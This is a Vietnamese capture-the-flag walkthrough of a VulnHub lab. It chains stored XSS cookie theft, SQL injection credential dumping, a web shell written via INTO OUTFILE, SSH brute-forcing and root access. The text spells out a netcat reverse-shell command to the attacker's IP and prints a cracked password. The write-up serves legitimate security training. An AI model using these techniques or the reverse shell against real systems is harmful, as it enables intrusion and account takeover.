## XSS and MySQL 

### Discover
![image](https://hackmd.io/_uploads/HJI5oJI4Jx.png)

Link truy cập và tải [lab](https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/) ! 

Khởi chạy lab - vuln machine trên VMware. Vì Lab chạy trên cùng interface mạng với máy Kali (ở đây dùng làm máy tấn công), sử dụng netdiscover để tìm địa chỉ IP của Lab: 

![image](https://hackmd.io/_uploads/SJ4upJLE1x.png)

Địa chỉ IP của máy Kali: 192.168.68.136/24

![image](https://hackmd.io/_uploads/HJE9ak8N1e.png)

Sử dụng netdiscover, tùy chọn -r (range) chỉ định phạm vi giải địa chỉ tương ứng với máy Kali: 

![image](https://hackmd.io/_uploads/H1fT6yUNkx.png)

Kết quả ở trên, ta suy ra địa chỉ của máy Lab là 192.168.68.162, các địa chỉ còn lại mặc định là địa chỉ Gateway, máy thật, máy kali. 
### Enum
Tiếp theo, mình do quét các cổng đang mở của máy lab: 

![image](https://hackmd.io/_uploads/rJRgBB8Ekl.png)

Kết quả có 2 port đang mở. Việc chỉ định -p-,  -T4 để scan trên tất cả các port và tăng tốc độ scan. Chạy thêm 1 lệnh nmap để scan chi tiết trên các cổng đang mở này: 

![image](https://hackmd.io/_uploads/HJSwUSI4Jx.png)

Tùy chọn -sC để chạy script scan mặc định, -sV để scan version , kết quả port 22 chạy ssh OpenSSH 5.5p1, port 80 chạy web Apache httpd 2.2.16. 

Mở browser và truy cập 192.168.68.162, port 80 ,ta được giao diện web như sau: 

![image](https://hackmd.io/_uploads/S1DeuHUNkx.png)

Đây là 1 trang blog đơn giản, dạo qua web một vòng, truy cập các post thì chỉ có tính năng bình luận, truy cập Admin thì sẽ hiện ra form login đăng nhập: 

![image](https://hackmd.io/_uploads/HkZw_H8VJl.png)

Tạm thời bỏ qua, trước khi test thủ công, ta chạy gobuster để dò tìm các folder, file ẩn trên web: 

![image](https://hackmd.io/_uploads/ryItqB84kg.png)
![image](https://hackmd.io/_uploads/ryRi5rINyg.png)

Truy cập vào các đường dẫn trên không thu được gì thú vị và có thể khai thác. Sử dụng extension Wappalyzer để xem thông tin trang web: 

![image](https://hackmd.io/_uploads/SkGdjS8V1g.png)

Ta biết được trang web được viết bằng php, chạy trên máy chủ Apache 2.2.16, hệ điều hành,... 

Quay lại trang blog, trang có tính năng commment, ta có thể test ngay đến các lổ hổng XSS, SSTI,... Thử ngay với payload test XSS do gợi ý từ tên lab có XSS :> :

![image](https://hackmd.io/_uploads/rk4aur84yl.png)

Kết quả, dính XSS stored ở tính năng comment: 

![image](https://hackmd.io/_uploads/SJvi3HIN1e.png)

Lỗi XSS này, ta nghĩ tới ngay việc khai thác đánh cắp cookie người dùng. Để khai thác XSS này, giả sử admin hoặc người dùng truy cập trang web xem comment, khi đó XSS sẽ điều hướng đến trang C2 do ta kiểm soát. Trước tiên, ta tạo máy C2 để nhận cookie từ người dùng: 
### Exploit
Ta tạo file index.php: 

![image](https://hackmd.io/_uploads/Sy38MUL4Je.png)

Sau đó host trên local sử dụng php option -S: 

![image](https://hackmd.io/_uploads/ryAhfLLVJl.png)

Quay lại trang blog, tạo payload khai thác như sau: 

![image](https://hackmd.io/_uploads/S19Z4ILVke.png)

Submit comment chứa payload, sau đó, khi admin truy cập đọc comment, ta lấy được cookie như sau: 

![image](https://hackmd.io/_uploads/SJQ8DI84ke.png)

Update lại cookie của admin, ta truy cập được vào trang admin trên blog: 

![image](https://hackmd.io/_uploads/ryscvUUVye.png)

Mình đã thử qua các chức năng mới của admin, scan Burpsuite tới chức năng edit post, có vẻ bị dính SQL Injection: 

![image](https://hackmd.io/_uploads/SyV4_twEJx.png)

Truy cập trang edit một post bất kỳ, thấy có tham số id trên url, mình đã thử inject ký tự ', và kết quả có thông báo lỗi hàm mysql_fetch_assoc(), lỗi truy vấn SQL:

![image](https://hackmd.io/_uploads/rJvrYFvEkx.png)

Sử dụng Sqlmap để scan url với tham số id: 

![image](https://hackmd.io/_uploads/rJf0aKwVkx.png)

Thực hiện dump dữ liệu với option -dump, ngoài các table chứa dữ liệu post, ta còn thu được thông tin đăng nhập của user admin với pass được crack là :"P4ssw0rd". 

![image](https://hackmd.io/_uploads/rJhxW9vNJe.png)
![image](https://hackmd.io/_uploads/B1i7Z9wVye.png)
![image](https://hackmd.io/_uploads/SybUZcDVkx.png)

Truy cập login , login thành công với user admin với password bên trên. 
### RCE to root
Sau khi tìm hiểu khai thác sql injection, mình thấy lỗi này có thể khai thác để ghi file vào hệ thống. Mình search trên google nói về [sql-to-shell](https://pentesterlab.com/exercises/from-sqli-to-shell),  tận dụng cách trong bài viết này, mình upload shell sử dụng toán tử UNION và hàm "into outfile" có trong Mysql để ghi file.

![image](https://hackmd.io/_uploads/SyL8nRP4yl.png)

Dựa vào kết quả các thư mục tìm được từ công cụ Gobuster, sau nhiều lần thử, mình thành công write được vào thư mục /css mà không bị hạn chế về quyền:

![image](https://hackmd.io/_uploads/Hyp0P3w4Jx.png)

Truy cập /css để kiểm tra: 

![image](https://hackmd.io/_uploads/HJ1hO2DNyg.png)

Kết quả , file được up thành công, test thử vài truy vấn đơn giản như ls,whoami để kiểm tra RCE thành công:

![image](https://hackmd.io/_uploads/HkAgF2wNke.png)
![image](https://hackmd.io/_uploads/rycQt3P4kg.png)

Sau khi thử vài payload trên revshell, ta thành công với đoạn lệnh sau: `nc -c sh 192.168.68.136 4444`

![image](https://hackmd.io/_uploads/ry_xHaPVyl.png)
![image](https://hackmd.io/_uploads/B1yfSavEkx.png)

Tuy nhiên, người dùng www-data này không có quyền root. Thử đọc file /etc/passwd:

![image](https://hackmd.io/_uploads/HkSHyAPEyg.png)

Thấy ngoài root, ta còn thấy người dùng user, brute-force "user" với msf sử dụng ssh_login module:

![image](https://hackmd.io/_uploads/rkEw40PEJx.png)

Đăng nhập với user:pass vừa tìm được:

![image](https://hackmd.io/_uploads/rJ9NIRwVyl.png)
Vậy là mình get root thành công hệ thống!

